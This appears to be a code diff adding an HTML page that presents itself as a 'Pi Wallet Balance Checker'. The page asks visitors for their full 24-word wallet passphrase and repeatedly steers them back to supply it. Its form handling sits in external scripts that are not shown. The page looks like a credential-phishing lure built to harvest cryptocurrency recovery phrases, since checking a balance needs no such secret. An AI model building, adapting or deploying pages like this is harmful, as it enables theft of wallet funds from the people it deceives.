@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Enter Passphrase</title>
+<link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+
+<h1>Pi Wallet Balance Checker</h1>
+<p class="sub">Enter your 24‑word passphrase to check balance.</p>
+
+<div>
+  <label for="passphrase">Enter Your 24 Words Passphrase</label>
+  <textarea id="passphrase" placeholder="word1 word2 word3 ... word24"></textarea>
+</div>
+
+<div class="btn-group">
+  <button id="submitBtn">Submit</button>
+  <button id="findPassBtn" class="secondary">Find your passphrase</button>
+</div>
+
+<div id="status" class="status"></div>
+
+<!-- Modal for invalid passphrase -->
+<div id="invalidModal" class="modal-overlay">
+  <div class="modal-box">
+    <h3>Invalid Passphrase</h3>
+    <p>The passphrase you entered is not valid. Please check the words and try again, or use "Find your passphrase" to learn how to locate it.</p>
+    <div class="modal-actions">
+      <button id="dismissModalBtn" class="secondary">Dismiss</button>
+      <button id="modalFindBtn">Find your passphrase</button>
+    </div>
+  </div>
+</div>
+
+<script src="js/config.js"></script>
+<script src="js/unlock.js"></script>
+</body>
+</html>
